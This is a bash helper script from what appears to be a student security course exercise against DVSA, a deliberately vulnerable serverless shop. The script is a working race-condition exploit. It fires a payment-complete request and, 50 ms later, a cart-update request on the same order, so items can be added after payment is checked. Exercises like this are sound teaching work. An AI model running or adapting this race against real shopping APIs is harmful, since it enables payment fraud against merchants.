#!/usr/bin/env bash
set -euo pipefail

# ICS344 DVSA Security Project
# Lesson 8 - Logic Vulnerabilities / TOCTOU Race Condition
#
# This helper script sends one payment-complete request and one cart-update
# request close together. In the original test, the browser payment click was
# also triggered at nearly the same time.
#
# Fill in these variables before running:
#   export TOKEN="<normal-user-jwt-token>"
#   export API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
#   export ORDER_ID="<fresh-order-id>"

: "${TOKEN:?Set TOKEN first, for example: export TOKEN='<jwt>'}"
: "${API:?Set API first, for example: export API='https://.../Stage/order'}"
: "${ORDER_ID:?Set ORDER_ID first, for example: export ORDER_ID='<order-id>'}"

PAYLOAD_PAY="/tmp/lesson8-pay.json"
PAYLOAD_UPDATE="/tmp/lesson8-update.json"
PAY_RESULT="/tmp/pay-result.txt"
UPDATE_RESULT="/tmp/update-result.txt"

printf '{"action":"complete","order-id":"%s"}' "$ORDER_ID" > "$PAYLOAD_PAY"
printf '{"action":"update","order-id":"%s","items":{"1014":5}}' "$ORDER_ID" > "$PAYLOAD_UPDATE"

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  --data-binary @"$PAYLOAD_PAY" > "$PAY_RESULT" &

sleep 0.05

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  --data-binary @"$PAYLOAD_UPDATE" > "$UPDATE_RESULT" &

wait

echo "Pay result:    $(cat "$PAY_RESULT")"
echo "Update result: $(cat "$UPDATE_RESULT")"
